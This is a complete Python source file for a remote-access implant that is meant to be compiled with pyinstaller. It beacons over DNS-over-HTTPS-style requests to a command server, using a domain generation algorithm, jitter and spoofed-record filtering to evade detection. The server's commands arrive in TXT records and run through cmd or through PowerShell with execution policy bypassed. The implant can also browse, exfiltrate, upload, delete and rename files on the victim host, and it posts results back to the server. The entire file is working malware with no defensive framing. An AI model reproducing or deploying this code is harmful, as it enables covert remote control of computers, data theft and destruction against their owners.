# pyinstaller --onefile DOH_NoEnc.py

import time
import uuid
import base64
import struct
import hashlib
import subprocess
import dns.message
import dns.rdatatype
import requests
import urllib3
import os
import random
import json
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

status_base64 = True
b64encode = base64.urlsafe_b64encode if status_base64 else base64.b64encode
b64decode = base64.urlsafe_b64decode if status_base64 else base64.b64decode

class DOH_Client:
    def __init__(self, server_url, id_token, user_agent=None, uris=None, dga_timer=300):
        self.server_url = server_url.rstrip("/")
        self.id_token = id_token.strip().lower()
        self.user_agents = [user_agent] if user_agent else ["Mozilla/5.0"]
        self.uris = uris if uris else ["/support/troubleshoot"]
        self.domain_pool = ["cloudflare-dns.com"]
        self.shadow_a_record = "0.0.0.0"
        self.pivot_a_record = "0.0.0.0"
        self.prepend_output = ""
        self.append_output  = ""
        self.dga_timer = dga_timer * 60
        self.jitter_start = 0.0
        self.jitter_end = 0.0
        self.session_id = None
        self.implant_seed = None
        self.last_domain_update = 0
        self.is_pivot_mode = False
        self.get_client_headers = {}
        self.post_client_headers = {}
        self.command_parts = {}
        self.current_checksum = None
        self.config_parts = {}
        self.current_config_checksum = None
        self.reconnect_threshold = 0.0
        self.disconnect_threshold = 0.0
        self.sleep_interval = 0.0

    def pick_random_uri(self):
        return random.choice(self.uris)

    def pick_random_ua(self):
        return random.choice(self.user_agents)

    def generate_strong_dga_domain(self, implant_seed=None):
        now = int(time.time())
        period = int(now // self.dga_timer)
        if not implant_seed:
            raw = f"{uuid.uuid4()}{time.time_ns()}{os.urandom(32).hex()}"
            implant_seed = hashlib.sha3_256(raw.encode()).hexdigest()
        seed_int = int(implant_seed[:16], 16)
        seed_material = struct.pack("<QQ", period, seed_int)
        h = hashlib.sha3_512(seed_material).digest()
        h = hashlib.sha3_512(h + seed_material[::-1]).digest()
        final = hashlib.sha3_512(h).digest()
        subdomain = base64.b32encode(final[:13]).decode().rstrip('=').lower()
        suffix = self.domain_pool[period % len(self.domain_pool)]
        return f"{subdomain}.{suffix}", implant_seed

    def get_current_dga_domain(self):
        if not self.implant_seed:
            domain, seed = self.generate_strong_dga_domain()
            self.implant_seed = seed
        else:
            domain, _ = self.generate_strong_dga_domain(self.implant_seed)
        return domain

    def is_spoof_txt(self, txt):
        txt_lower = txt.lower()
        if any(txt_lower.startswith(p) for p in ["i=", "cb:", "cmd_info:", "cmd_complete:", "dga=", "cfg:", "cfg_info:"]):
            return False
        if txt_lower.startswith("v=") or txt_lower.startswith("session_id:"):
            return False
        if "azure-verification" in txt_lower or "login.microsoftonline.com" in txt_lower:
            return True
        return False

    def parse_init_payload(self, txt):
        try:
            params = {}
            for part in txt.split('|'):
                if '=' not in part:
                    continue
                key, value = part.split('=', 1)
                key = key.strip()
                value = value.strip()
                params[key] = value

            if 'i' in params:
                self.session_id = params['i']
            if 'j' in params:
                jitter = params['j'].split('-')
                self.jitter_start = int(jitter[0].strip())
                self.jitter_end = int(jitter[1].strip())
            if 't' in params:
                self.dga_timer = int(params['t']) * 60
            if 'r' in params:
                self.reconnect_threshold = float(params['r'])
            if 'd' in params:
                self.disconnect_threshold = float(params['d'])
            if 'sl' in params:
                self.sleep_interval = float(params['sl'])
        except Exception:
            pass

    def parse_command_part(self, txt):
        try:
            if not txt.startswith("cb:"):
                return False
            txt = txt[3:]
            first_colon = txt.find(':')
            if first_colon == -1:
                return False
            part_total = txt[:first_colon]
            remaining = txt[first_colon + 1:]
            second_colon = remaining.find(':')
            if second_colon == -1:
                return False
            checksum = remaining[:second_colon]
            data = remaining[second_colon + 1:]

            if '/' not in part_total:
                return False
            part_str, total_str = part_total.split('/', 1)
            part_num = int(part_str)
            total_parts = int(total_str)

            if checksum not in self.command_parts:
                self.command_parts[checksum] = {
                    'parts': [''] * total_parts,
                    'total': total_parts,
                    'received_count': 0
                }

            cmd_data = self.command_parts[checksum]
            if cmd_data['parts'][part_num - 1] == '':
                cmd_data['parts'][part_num - 1] = data
                cmd_data['received_count'] += 1

            self.current_checksum = checksum
            return True
        except Exception:
            return False

    def parse_config_part(self, txt):
        try:
            if not txt.startswith("cfg:"):
                return False
            txt = txt[4:]
            first_colon = txt.find(':')
            if first_colon == -1:
                return False
            part_total = txt[:first_colon]
            remaining = txt[first_colon + 1:]
            second_colon = remaining.find(':')
            if second_colon == -1:
                return False
            checksum = remaining[:second_colon]
            data = remaining[second_colon + 1:]

            if '/' not in part_total:
                return False
            part_str, total_str = part_total.split('/', 1)
            part_num = int(part_str)
            total_parts = int(total_str)

            if checksum not in self.config_parts:
                self.config_parts[checksum] = {
                    'parts': [''] * total_parts,
                    'total': total_parts,
                    'received_count': 0
                }

            cfg_data = self.config_parts[checksum]
            if cfg_data['parts'][part_num - 1] == '':
                cfg_data['parts'][part_num - 1] = data
                cfg_data['received_count'] += 1

            if cfg_data['received_count'] == cfg_data['total']:
                full_text = ''.join(cfg_data['parts'])
                calculated = hashlib.sha256(full_text.encode('utf-8')).hexdigest()[:8]
                if calculated == checksum:
                    self.apply_config_payload(full_text)
                del self.config_parts[checksum]

            return True
        except Exception:
            return False

    def apply_config_payload(self, full_text):
        try:
            params = {}
            for part in full_text.split('|'):
                if '=' not in part:
                    continue
                key, value = part.split('=', 1)
                key = key.strip()
                value = value.strip()
                params[key] = value

            if 'uas' in params and params['uas']:
                self.user_agents = [ua.strip() for ua in params['uas'].split(',') if ua.strip()]

            if 'uris' in params and params['uris']:
                self.uris = ['/' + u.strip().lstrip('/') for u in params['uris'].split(',') if u.strip()]

            if 'pre' in params:
                self.prepend_output = params['pre']

            if 'app' in params:
                self.append_output = params['app']

            if 'geth' in params and params['geth']:
                try:
                    pairs = [p.strip() for p in params['geth'].split(';') if p.strip()]
                    self.get_client_headers = {}
                    for pair in pairs:
                        if ':' in pair:
                            k, v = pair.split(':', 1)
                            self.get_client_headers[k.strip()] = v.strip()
                except Exception:
                    pass

            if 'posth' in params and params['posth']:
                try:
                    pairs = [p.strip() for p in params['posth'].split(';') if p.strip()]
                    self.post_client_headers = {}
                    for pair in pairs:
                        if ':' in pair:
                            k, v = pair.split(':', 1)
                            self.post_client_headers[k.strip()] = v.strip()
                except Exception:
                    pass
        except Exception:
            pass

    def parse_cmd_info(self, txt):
        pass

    def check_command_complete(self, txt):
        try:
            if not txt.startswith("cmd_complete:"):
                return None
            checksum = txt[13:].strip()
            if checksum in self.command_parts:
                cmd_data = self.command_parts[checksum]
                if cmd_data['received_count'] == cmd_data['total']:
                    full_encoded = ''.join(cmd_data['parts'])
                    try:
                        full_command = b64decode(full_encoded).decode('utf-8')
                        calculated_checksum = hashlib.sha256(full_command.encode('utf-8')).hexdigest()[:8]
                        if calculated_checksum == checksum:
                            del self.command_parts[checksum]
                            return full_command
                        else:
                            del self.command_parts[checksum]
                            return None
                    except Exception:
                        del self.command_parts[checksum]
                        return None
            return None
        except Exception:
            return None

    def apply_jitter(self):
        if self.jitter_start > self.jitter_end:
            self.jitter_start, self.jitter_end = self.jitter_end, self.jitter_start
        jitter_amount = random.randint(self.jitter_start, self.jitter_end)
        final_sleep = self.sleep_interval + jitter_amount
        time.sleep(final_sleep)

    def browse_directory(self, path):
        try:
            if path.startswith('~'):
                path = os.path.expanduser(path)     
            if not os.path.exists(path):
                return {'success': False, 'error': f"Path does not exist: {path}", 'current_path': path, 'parent_path': None, 'items': []}
            items = []
            try:
                entries = os.listdir(path)
            except PermissionError:
                return {'success': False, 'error': f"Permission denied to access {path}", 'current_path': path, 'parent_path': None, 'items': []}
            for item in entries:
                item_path = os.path.join(path, item)
                try:
                    stat = os.stat(item_path)
                    is_dir = os.path.isdir(item_path)
                    modified_timestamp = stat.st_mtime
                    modified_time = datetime.fromtimestamp(modified_timestamp).strftime('%Y-%m-%d %H:%M:%S')
                    size_bytes = stat.st_size if not is_dir else 0    
                    items.append({'name': item, 'type': 'directory' if is_dir else 'file', 'size': size_bytes, 'modified_time': modified_time})
                except (PermissionError, OSError):
                    continue
            items.sort(key=lambda x: (x['type'] != 'directory', x['name'].lower()))
            parent_path = os.path.dirname(path)
            if path.endswith(':\\') or path == '/':
                parent_path = None
            elif parent_path == path:
                parent_path = None
            return {'success': True, 'current_path': path, 'parent_path': parent_path, 'items': items}
        except Exception as e:
            return {'success': False, 'error': str(e), 'current_path': path, 'parent_path': None, 'items': []}

    def download_file(self, filepath):
        try:
            if not os.path.exists(filepath):
                return f"ERROR: File not found: {filepath}"
            filesize = os.path.getsize(filepath)
            filename = os.path.basename(filepath)
            with open(filepath, 'rb') as f:
                file_data = f.read()
            file_data_b64 = base64.b64encode(file_data).decode('ascii')
            return f"file-data:{filename}|{filesize}|{file_data_b64}"
        except Exception as e:
            return f"ERROR: {str(e)}"

    def upload_file(self, filepath, filedata_b64):
        try:
            file_data = base64.b64decode(filedata_b64)
            directory = os.path.dirname(filepath)
            if directory and not os.path.exists(directory):
                os.makedirs(directory)
            with open(filepath, 'wb') as f:
                f.write(file_data)
            return f"SUCCESS: File uploaded to {filepath}"
        except Exception as e:
            return f"ERROR: {str(e)}"

    def delete_file(self, filepath):
        try:
            if os.path.isdir(filepath):
                os.rmdir(filepath)
            else:
                os.remove(filepath)
            return f"SUCCESS: Deleted {filepath}"
        except Exception as e:
            return f"ERROR: {str(e)}"

    def rename_file(self, old_path, new_path):
        try:
            os.rename(old_path, new_path)
            return f"SUCCESS: Renamed to {new_path}"
        except Exception as e:
            return f"ERROR: {str(e)}"

    def run_cmd_command(self, cmd):
        try:
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                encoding="utf-8",
                errors="replace",
            )
            output = result.stdout + result.stderr
            if result.returncode != 0:
                output += f"\n[Exit Code: {result.returncode}]"
            return output.strip() if output.strip() else "[+] Command executed (no output)"
        except subprocess.TimeoutExpired:
            return "[-] Command timed out after 90 seconds"
        except Exception as e:
            return f"[-] CMD execution error: {str(e)}"

    def run_powershell_command(self, ps_cmd):
        try:
            result = subprocess.run(
                [
                    "powershell.exe",
                    "-NoProfile",
                    "-ExecutionPolicy", "Bypass",
                    "-Command",
                    ps_cmd
                ],
                capture_output=True,
                text=True,
                encoding="utf-8",
                errors="replace",
            )
            output = result.stdout + result.stderr
            if result.returncode != 0:
                output += f"\n[Exit Code: {result.returncode}]"
            return output.strip() if output.strip() else "[+] PowerShell command executed (no output)"
        except subprocess.TimeoutExpired:
            return "[-] PowerShell command timed out after 120 seconds"
        except Exception as e:
            return f"[-] PowerShell execution error: {str(e)}"

    def execute_command(self, raw_cmd):
        command = (raw_cmd or "").strip()
        if not command:
            return "[no command received]"

        if command.startswith("browse:"):
            browse_path = command[7:].strip()
            if not browse_path:
                browse_path = os.getcwd()
            dir_data = self.browse_directory(browse_path)
            json_str = json.dumps(dir_data, ensure_ascii=False)
            base64_data = base64.b64encode(json_str.encode('utf-8')).decode('ascii')
            return f"browse-data-{base64_data}"
        
        if command.startswith("download-file:"):
            filepath = command[14:].strip()
            return self.download_file(filepath)
        
        if command.startswith("upload-file:"):
            parts = command[12:].split('|', 1)
            if len(parts) == 2:
                filepath, filedata_b64 = parts
                return self.upload_file(filepath, filedata_b64)
            else:
                return "ERROR: Invalid upload format"
        
        if command.startswith("delete-file:"):
            filepath = command[12:].strip()
            return self.delete_file(filepath)
        
        if command.startswith("rename-file:"):
            parts = command[12:].split('|', 1)
            if len(parts) == 2:
                old_path, new_path = parts
                return self.rename_file(old_path, new_path)
            else:
                return "ERROR: Invalid rename format"

        upper_cmd = command.upper()
        if upper_cmd.startswith("EP "):
            ps_command = command[3:].strip()
            result_str = self.run_powershell_command(ps_command)
        elif upper_cmd.startswith("EP"):
            ps_command = command[2:].strip()
            result_str = self.run_powershell_command(ps_command)
        else:
            result_str = self.run_cmd_command(command)

        return result_str

    def send_doh_query(self):
        try:
            headers = {
                "User-Agent": self.pick_random_ua(),
                "Accept": "application/dns-message"
            }
            current_domain = self.get_current_dga_domain()
            query_domain = f"{self.id_token}.{current_domain}"
            q = dns.message.make_query(query_domain, dns.rdatatype.TXT)
            q.find_rrset(q.question, dns.name.from_text(query_domain),
                         dns.rdataclass.IN, dns.rdatatype.A, create=True)
            wire = q.to_wire()
            enc = b64encode(wire).decode().rstrip("=")
            uri = self.pick_random_uri()
            url = f"{self.server_url}/{uri.lstrip('/')}"
            params = {"dns": enc}
            if self.session_id:
                params["session_id"] = self.session_id
            r = requests.get(url, params=params, headers=headers, verify=False)
            if r.status_code != 200:
                return None
            msg = dns.message.from_wire(r.content)
            completed_command = None
            found_a_record = False
            for rrset in msg.answer:
                if rrset.rdtype == dns.rdatatype.A:
                    for rd in rrset:
                        ip = rd.address
                        found_a_record = True
                        if ip == self.pivot_a_record:
                            self.is_pivot_mode = True
                        elif ip == self.shadow_a_record:
                            self.is_pivot_mode = False
                elif rrset.rdtype == dns.rdatatype.TXT:
                    for rd in rrset:
                        txt = rd.to_text().strip('"')
                        if self.is_spoof_txt(txt):
                            continue
                        if txt.startswith("i="):
                            self.parse_init_payload(txt)
                        elif txt.startswith("dga="):
                            parts = txt[4:].strip().split('|')
                            new_domain = parts[0]
                            if len(parts) > 1 and parts[1].startswith("seed="):
                                new_seed = parts[1][5:]
                                self.implant_seed = new_seed
                        elif txt.startswith("cb:"):
                            self.parse_command_part(txt)
                        elif txt.startswith("cfg:"):
                            self.parse_config_part(txt)
                        elif txt.startswith("cmd_info:"):
                            self.parse_cmd_info(txt)
                        elif txt.startswith("cmd_complete:"):
                            cmd = self.check_command_complete(txt)
                            if cmd:
                                completed_command = cmd
            if not found_a_record:
                self.is_pivot_mode = False
            return completed_command
        except Exception:
            return None

    def send_output(self, output):
        if not self.session_id:
            return False
        final_output = self.prepend_output + (output or "[no output]") + self.append_output
        
        try:
            uri = self.pick_random_uri()
            url = f"{self.server_url}/{uri.lstrip('/')}"
            payload = {
                "session_id": self.session_id,
                "output": final_output,
                "action": "submit"
            }
            headers = {"User-Agent": self.pick_random_ua()}
            headers.update(self.post_client_headers)

            r = requests.post(url, json=payload, headers=headers, verify=False)
            return r.status_code == 200
        except Exception:
            return False

    def run(self):
        while True:
            try:
                completed_cmd = self.send_doh_query()
                if completed_cmd:
                    out = self.execute_command(completed_cmd)
                    self.send_output(out)
                self.apply_jitter()
            except KeyboardInterrupt:
                break
            except Exception:
                time.sleep(60)

if __name__ == "__main__":
    server_url = "https://192.168.1.107:1111"
    id_token = "c952fab2-3c1f-4b3d-9f73-21ed6f914440"
    client = DOH_Client(server_url, id_token, dga_timer=5)
    client.run()
